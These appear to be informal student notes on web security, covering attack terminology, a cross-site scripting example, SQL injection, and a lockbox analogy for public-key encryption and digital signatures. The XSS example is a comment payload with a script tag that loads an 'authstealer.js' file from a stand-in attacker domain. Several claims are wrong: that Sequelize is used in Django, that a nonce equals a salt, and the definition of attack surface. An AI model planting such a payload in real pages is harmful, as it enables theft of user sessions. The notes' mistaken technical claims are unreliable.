# Security!

-------
security is like a mindset. Where are possible avenues that some attacker could compromise the application to get sensitive data. 

we as a general community have come up with ways to defend websites against common attacks. 

adversaries - those who would want to bring an app down
attack surface - vulnerabilities that a particular person has.
attack vector - ways that adversaries can attack a target
risks - what the target has to lose
mitigation - how a target can prevent an attack from happening
---------

cross-site injection attack

```
```I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">```

```
https://xkcd.com/327/


SQL Injections are a common type of attack. Use Sequelize in Django to help prevent unwanted inputs...sequelize is SQL's version of mongo's mongoose. 

Symmetric Cryptography
* one key that locks and unlocks the box. You can hand that key to someone else to lock and unlock that box. Downside: if that key gets stolen, that person has access to your lockbox and everything in it. 

Assymetric Cryptography
* Public-key cryptography
You have two keys. One key is for locking. And the other key is for unlocking. 

This box has a very special lock: three states:

* A (locked)
* B (unlocked)
* C (locked)

It has two separate keys. The first one can only turn clockwise (from A to B to C). The second one can only turn counterclockwise (C to B to A).

One is a "private" key and the other is a "public" key. It's private only because the owner has it. The second is "public" because copies can be made. 

We can do things with these keys:

Imagine you want to send the owner a very personal document. You put the document in the box and use a copy of her public-key to lock it. Remember, the owner's key only turns anti-clockwise, so you turn it to position A. Not the box is locked. The only key that can turn from A to B is the owner's private key, the one the owner kept to themselves. 

This is what we call a public key encryption. Everyone who has the owner's public key can put documents in her box, lock it, and know that the only person who can unlock it is Anna. 


-----
Digital Signatures

There is one more interesting use of this box. 

Suppose the owner puts a document in it. Then she uses her private key to lock the box (i.e. she turns the key to position C)

Why would the owner do this? After all, anyone with the public-key can unlock it. 

Someone delivers me this box and says it's from the owner. I don't believe him, but I pick the owner's public-key from the drawer and I try it. I turn right, nothing. I turn left and the box opens! this can only mean one thing: the box was locked with the private key. That means the owner put the documents in the box. This is called a 'digital signature'. 

Nonce = SALT